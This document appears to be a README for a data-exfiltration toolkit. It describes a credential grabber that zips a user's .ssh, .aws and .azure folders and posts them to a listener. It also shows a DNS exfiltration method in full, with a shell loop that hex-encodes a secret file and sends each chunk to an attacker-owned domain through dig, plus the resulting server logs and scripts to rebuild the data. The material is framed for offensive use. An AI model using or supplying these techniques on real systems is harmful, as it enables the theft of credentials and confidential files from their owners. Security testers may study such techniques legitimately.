# Data Exfiltration examples

There are two examples here for different target types: one uses an HTTP target which can be run on an arbitrary port. The other relies on the attacker having access to a DNS server and the logs. You could also use tcpdump/tshark to sniff DNS Lookup Packets going out, but there are other tutorials for that.

## CredsGrabber

Sample code to search through well known creds repositories for osx/linux (.ssh/.aws/.azure), zip up the contents and post them to an ephemeral web listener


**credsgrabber.py** is the local collector  and **server.py** is your listener.


## DNS Exfiltration

**dns_exfil.sh** - runs in the environment you want to move data out of. Presumes you have a file called "secret_documents.txt", but change this up to create the zipped payload. This will hex the zipfile then iteratively query the DNS server we own. 

For example:

The zipfile in hexed form will comprise lines like:
```
504b030414000000080037bc03530b2c23bbf40700004111000014001c00
7365637265745f646f63756d656e74732e74787455540900035ad209615a
d2096175780b0001046b2b0000046b2b0000a557cb8e23c711bccf5714e6
4c133b9674b07d587865195ec00fd85a7d40b13bc94e4d55574f3dc8a1bf
de1159dd1c8e2c0b027c9921bbeb91191991917cf832892bd5cfa3cfa3fb
<...>
```

So we run:
```
user@securecompany:~$ for b in `cat secret_documents.hex`
> do
> dig $b.mydomain.net
> done

; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> 504b030414000000080037bc03530b2c23bbf40700004111000014001c00.mydomain.net
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 63233
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;504b030414000000080037bc03530b2c23bbf40700004111000014001c00.mydomain.net. IN A
```
which produces logs like:

```
4-Aug-2021 00:20:26.964 query-errors: info: client @0x7f4de00aa050 77.125.168.17#6672 (pizzaseo.com): query failed (REFUSED) for pizzaseo.com/IN/RRSIG at ../../../bin/named/query.c:6980
04-Aug-2021 00:20:29.218 queries: info: client @0x7f4de00aa050 123.456.111.11#64665 (504b030414000000080037bc03530b2c23bbf40700004111000014001c00.mydomain.net): query: 504b030414000000080037bc03530b2c23bbf40700004111000014001c00.mydomain.net IN A -E(0)DC (10.15.16.10)
04-Aug-2021 00:20:29.279 queries: info: client @0x7f4de00aa050 123.456.111.11#50114 (7365637265745f646f63756d656e74732e74787455540900035ad209615a.mydomain.net): query: 7365637265745f646f63756d656e74732e74787455540900035ad209615a.mydomain.net IN A -E(0)DC (10.15.16.10)
04-Aug-2021 00:20:29.288 queries: info: client @0x7f4de00aa050 123.456.111.11#4282 (d2096175780b0001046b2b0000046b2b0000a557cb8e23c711bccf5714e6.mydomain.net): query: d2096175780b0001046b2b0000046b2b0000a557cb8e23c711bccf5714e6.mydomain.net IN A -E(0)DC (10.15.16.10)
```
which will need to be extracted to recreate the hexfile.

**extract_dns_queries.py** - runs on a DNS server you control to rebuild the hex data from the lookups. Converts the log lines into a hexfile named dns_exfil_output.hex

**hex_rebuild.sh** - simple shell script to rebuild the hexfile back into a zipfile and unzip the data. Be thoughtful about how this works for large files/datasets.



